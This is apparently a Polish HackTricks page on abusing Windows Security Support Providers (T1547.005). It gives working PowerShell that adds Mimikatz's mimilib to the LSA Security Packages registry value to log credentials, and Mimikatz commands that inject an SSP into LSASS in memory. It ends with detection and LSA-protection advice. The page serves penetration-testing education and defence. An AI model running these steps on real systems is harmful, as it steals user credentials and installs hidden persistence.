# Niestandardowi dostawcy obsługi zabezpieczeń

{{#include ../../banners/hacktricks-training.md}}

[Security Support Providers (SSPs)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi) to oparte na bibliotekach DLL pakiety zabezpieczeń ładowane przez Local Security Authority (LSA). Windows rejestruje niestandardowe biblioteki DLL SSP/AP za pomocą wartości `REG_MULTI_SZ` `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` i ładuje zarejestrowane pakiety podczas uruchamiania systemu.<sup>[[1]](#references)</sup>

Ponieważ SSP działają w LSA i mogą otrzymywać dane uwierzytelniające, adversaries mogą nadużywać złośliwego pakietu w celu uzyskania dostępu do danych uwierzytelniających i utrzymania persistence. MITRE śledzi to zachowanie jako T1547.005.<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Mimikatz zawiera `mimilib.dll`, który implementuje SSP rejestrujący dane uwierzytelniające obsługiwane po jego załadowaniu. W autoryzowanym labie umieść bibliotekę DLL odpowiadającą architekturze celu w `C:\Windows\System32`, a następnie sprawdź bieżącą listę pakietów przed jej zmianą.<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
Typowa istniejąca wartość może zawierać pakiety takie jak `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg` i `pku2u`. Podczas dodawania niestandardowego pakietu zachowaj każdy istniejący wpis.<sup>[[1]](#references)</sup>

Dodaj `mimilib` bez zastępowania istniejących pakietów:
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
Po ponownym uruchomieniu pakiet jest ładowany do LSA, a kolejne przechwycone dane uwierzytelniające są zapisywane przez tę implementację w pliku `C:\Windows\System32\kiwissp.log`.<sup>[[2]](#references)[[3]](#references)</sup>

## Ładowanie w pamięci

Mimikatz może również wstrzyknąć swoją implementację SSP do bieżącego procesu LSASS:<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
Ta metoda nie utrzymuje się po ponownym uruchomieniu systemu.<sup>[[2]](#references)[[3]](#references)</sup>

## Wykrywanie i przeciwdziałanie

Monitoruj zmiany w `...\Lsa\Security Packages` oraz nieoczekiwane ładowanie bibliotek DLL do `lsass.exe`. Zdarzenie zabezpieczeń 4657 rejestruje modyfikację **wartości** rejestru tylko wtedy, gdy skonfigurowano odpowiednią zasadę Audit Registry oraz SACL.<sup>[[2]](#references)[[4]](#references)</sup>

Jeśli jest to zgodne z danym środowiskiem, włącz dodatkową ochronę LSA i zbadaj niepodpisane lub nieoczekiwane biblioteki DLL SSP. Firma Microsoft opisuje ochronę LSA jako zabezpieczenie przed code injection, które mogłoby zagrozić poświadczeniom.<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - Rejestrowanie bibliotek DLL SSP/AP](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Repozytorium Mimikatz - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Zdarzenie zabezpieczeń 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - Konfigurowanie dodatkowej ochrony LSA](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
